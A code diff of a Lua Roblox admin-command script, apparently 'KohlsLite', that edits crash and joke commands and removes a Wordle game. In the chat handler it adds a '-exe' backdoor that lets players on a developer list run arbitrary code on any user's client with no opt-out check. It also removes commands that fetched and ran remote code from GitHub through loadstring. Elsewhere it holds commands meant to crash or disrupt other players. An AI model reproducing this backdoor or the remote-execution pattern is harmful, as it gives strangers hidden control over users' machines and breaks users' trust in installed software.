@@ -448,7 +448,8 @@ local backend_stuff = {
 	ratelj = false, -- ignore
 	eincrash = false, -- ignore
 	notifiedRespectFiltering = false,
-	regfind = false
+	regfind = false,
+	i_like_my_9jn_drippy_bruh = true
 }
 
 -- Stats when loading (Stats code at end)
@@ -616,7 +617,7 @@ local peft = {
 }
 	
 -- The developer of KohlsLite
-local specialperms = {
+specialperms = {
     "me_123eq",
     "me_crashking",
     "ScriptingProgrammer",
@@ -5672,50 +5673,47 @@ return
     end
 
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'wordle' then
-	Speak("I'm guessing of a 5-letter word, can you guess what it is with 6 guesses?")
-
-	wordle_stuff.wordle_game = true
-			
-	local length = 0
-			
-	for _ in pairs(wordsTable) do
-    		length = length + 1
-	end
-			
-	wordle_stuff.wordle_word = wordsTable[math.random(1, length)]
-	Remind("The word is ".. wordle_stuff.wordle_word); print("Wordle word is ".. wordle_stuff.wordle_word)
+	Remind("no")
    end
 
-   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'goon' then -- joke... should I make this command work for anyone?
+   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'goon' then
 		Remind("GOONER?")
 		local args = string.split(msg, " ")
+		users = "me"
 		if #args == 2 then
 			freaky = tonumber(args[2])
+		elseif #args == 3 then
+			users = args[2]
+			freaky = tonumber(args[2])
 		else
-			freaky = math.random(1,11)
+			freaky = math.random(1,12)
 		end
 		if freaky == 1 then
-			Chat(prefix.."gchar me KonekoKittenWasTaken")
+			Chat(prefix.."gchar ".. users.. " KonekoKittenWasTaken")
 		elseif freaky == 2 then
-			Chat(prefix.."gchar me PGHLego1945")
+			Chat(prefix.."gchar ".. users.. " PGHLego1945")
 		elseif freaky == 3 then
-			Chat(prefix.."gchar me notive")
+			Chat(prefix.."gchar ".. users.. " notive")
 		elseif freaky == 4 then
-			Chat(prefix.."gchar me RealKoofy")
+			Chat(prefix.."gchar ".. users.. " RealKoofy")
 		elseif freaky == 5 then
-			Chat(prefix.."gchar me TheRibsRibs")
+			Chat(prefix.."gchar ".. users.. " TheRibsRibs")
 		elseif freaky == 6 then
-			Chat(prefix.."gchar me PotemerForReal")
+			Chat(prefix.."gchar ".. users.. " PotemerForReal")
 		elseif freaky == 7 then
-			Chat(prefix.."gchar me Nathorix")
+			Chat(prefix.."gchar ".. users.. " Nathorix")
 		elseif freaky == 8 then
-			Chat(prefix.."gchar me MilkdedX")
+			Chat(prefix.."gchar ".. users.. " MilkdedX")
 		elseif freaky == 9 then
-			Chat(prefix.."gchar me maddybIox")
+			Chat(prefix.."gchar ".. users.. " maddybIox")
 		elseif freaky == 10 then
-			Chat(prefix.."gchar me MisterObvious")
+			Chat(prefix.."gchar ".. users.. " MisterObvious")
+		elseif freaky == 11 then
+			Chat(prefix.."gchar ".. users.. " kamguyzaa")
+		elseif freaky == 12 then
+			Chat(prefix.."gchar ".. users.. " BonkieDog")
 		else
-			Chat(prefix.."gchar me kamguyzaa")
+			Remind("Number must be between 1 and 12.")
 		end
     end
 
@@ -6226,15 +6224,15 @@ return
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ecrash' then -- This command is DYNAMIC
  		local args = string.split(msg, " ")
-		if #args == 2 then
-			custardmessage = args[2]
+		if #args >= 2 then
+			custardmessage = table.concat(args, " ", 2)
 		else
 			custardmessage = "You have been kicked for suspicious behaviour."
 		end
         	Chat("fix")
         	player_relate.musicsay = false
             	Chat("h \n\n\n\n\n "..custardmessage.." \n\n\n\n\n")
-		Chat(prefix.."gmusic139")
+		Chat(prefix.."gmusic175")
            	Chat("fogcolor 0 0 0")
 		Chat("time 0")
 		Chat("fogend 0")
@@ -6244,7 +6242,7 @@ return
             	DCrash()        
     end
 
-    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'bcrash' then 
+    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'bcrash' then -- this probably doesn't work but idc
 Chat("h \n\n\n\n\n "..[[
 		
                /                Your device ran into a problem and needs to restart.
@@ -6323,7 +6321,7 @@ Chat("h \n\n\n\n\n "..[[
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'chcrash' then
  		local args = string.split(msg, " ")
         	local specialid = args[2]
-		if #args >= 2 then
+		if #args == 2 then
         		mehcrashchariz = game.Players:GetUserIdFromNameAsync(specialid)
 		else
 			local myusername = game.Players.LocalPlayer.Name
@@ -12317,56 +12315,6 @@ local thorns_commands = {
 	stun = true,
 }
 
-wordle_stuff = {
-	wordle_word = " ",
-	wordle_game = false,
-}
-
-local HttpService = game:GetService("HttpService")
-
-local success, wordle_game_words = pcall(function()
-    return HttpService:GetAsync("https://gist.githubusercontent.com/slushman/34e60d6bc479ac8fc698df8c226e4264/raw/cf702f098856c72a81d79f69b11f0a8c333e7d2f/wordle-list")
-end)
-
-if success then
-	wordsTable = HttpService:JSONDecode(wordle_game_words)
-else
-	print("Failed to fetch the Wordle word list.")
-end
-
-function check_letters(correctWord, guess)
-	local feedback = {}
-	local freq = {}
-    
-	for i = 1, #correctWord do
-        	local char = correctWord:sub(i, I)
-        	freq[char] = (freq[char] or 0) + 1
-    	end
-    
-    	for i = 1, #guess do
-        	local guessChar = guess:sub(i, I)
-        	local correctChar = correctWord:sub(i, I)
-        
-        	if guessChar == correctChar then
-            		feedback[i] = "🟩"  -- Green
-            		freq[correctChar] = freq[correctChar] - 1
-        	end
-    	end
-    
-    	for i = 1, #guess do
-        	if not feedback[i] then
-            		local guessChar = guess:sub(i, I)
-           		if freq[guessChar] and freq[guessChar] > 0 then
-                		feedback[i] = "🟨"  -- Yellow
-                		freq[guessChar] = freq[guessChar] - 1
-            		else
-                		feedback[i] = "⬛"  -- Grey
-            		end
-        	end
-    	end
-    
-    	return feedback
-end
 
 
 -- Thorns, noob detector, all admin
@@ -12375,23 +12323,7 @@ function PLRSTART(v)
             task.wait(0)
             task.spawn(function()
                     task.wait(0)
-            		local guess = string.sub(msg:lower(), 1, 5)
-            
-            		if wordsTable[guess] and wordle_stuff.wordle_game then
-                		local feedback = check_letters(wordle_stuff.wordle_word, guess)
-                		local feedbackString = table.concat(feedback, " ")
-                
-                		Speak("Wordle Feedback: ".. feedbackString)
 
-				if wordle_stuff.wordle_word_guesses == 6 and guess ~= wordle_stuff.wordle_word then
-					Speak("Game over! The word was ".. wordle_stuff.wordle_word)
-				end
-	
-                		if guess == wordle_stuff.wordle_word then
-                    			Speak(v.Name .. " guessed the word!")
-                    			wordle_stuff.wordle_game = false
-                		end
-            		end	
 
 			-- Thorns (for the user they did it upon, just turn the antis on)
 			local args = string.split(msg, " ")
@@ -12578,6 +12510,7 @@ function PLRSTART(v)
 		    -- // Remove this if you want, just don't abuse with KohlsLite, okay? \\ --
 
                     if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klc means KohlsLite Check
+			print("Oh no, I'm in danger")
                         if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				--print("kohlslite user")
 			else
@@ -12686,31 +12619,19 @@ function PLRSTART(v)
 			end
                     end
 
+
+		-- for some reason the dev commands aren't working soo
+                    if string.sub(msg:lower(), 0, 4) == "-exe" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+			    Execute(string.sub(msg, 6))
+                    end
+
+
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                         if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("run")
 			else
                             Execute(string.sub(msg, 6))
                         end
-                    end
-
-                    if string.sub(msg:lower(), 0, 4) == "-kls" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then 
-				-- print("si")
-			else
-                        	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
-
-			end
-                    end
-
-                    if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
-				-- print("si")
-			else
-                        	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
-			end
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -15276,7 +15197,7 @@ function partDraw()
         end
 	
         drawState = not drawState
-	print(drawState)
+	--print(drawState)
 
         if drawState == false then
             for _,connection in pairs(Connections.Drawing) do
@@ -17595,7 +17516,7 @@ function attach(part)
                                         Chat("respawn me")
                                         ColFix()
                                         GravFix()
-                                        Remind("Something went wrong moving the parts. Fixing game and respawning..")
+                                        Remind("Something went wrong moving the parts. Fixing game and respawning...")
                                         tasmove = false
                                 end
                                 if tasmove == false then 
@@ -17612,7 +17533,7 @@ function attach(part)
                                         Chat("respawn me")
                                         ColFix()
                                         GravFix()
-                                        Remind("Something went wrong moving the parts. Fixing game and respawning..")
+                                        Remind("Something went wrong moving the parts. Fixing game and respawning...")
                                         tasmove = false
                                 end 
                                 if tasmove == false then 
@@ -17641,7 +17562,7 @@ task.spawn(function()
                         Chat("respawn me")
                         ColFix()
                         GravFix()
-                        Remind("Moving the part has stopped due to no character or no admin, respawning and fixing game..")
+                        Remind("Moving the part has stopped due to no character or no admin, respawning and fixing game...")
                 end
         end
 end)
@@ -18126,8 +18047,8 @@ end
 -- Player stuff
 for i, v in pairs(game.Players:GetPlayers()) do
 
-        if v.Name == "9jn" or v.Name == "9gn" then
-                        antiraygun = true
+        if (v.Name == "9jn" or v.Name == "9gn") and backend_stuff.i_like_my_9jn_drippy_bruh then
+                        gear_antis.antiraygun = true
 			Remind("Anti ray gun enabled (9jn found in server).")
         end
 
@@ -18187,7 +18108,7 @@ for i, v in pairs(game.Players:GetPlayers()) do
         PLRSTART(v)
 end
 
--- These run last to prevent bugs
+-- These run last to prevent bugs (old remanent)
 startupScripts()
 
 Stats.loadedtime = string.format("%.2f", os.clock() - Stats.starttime)
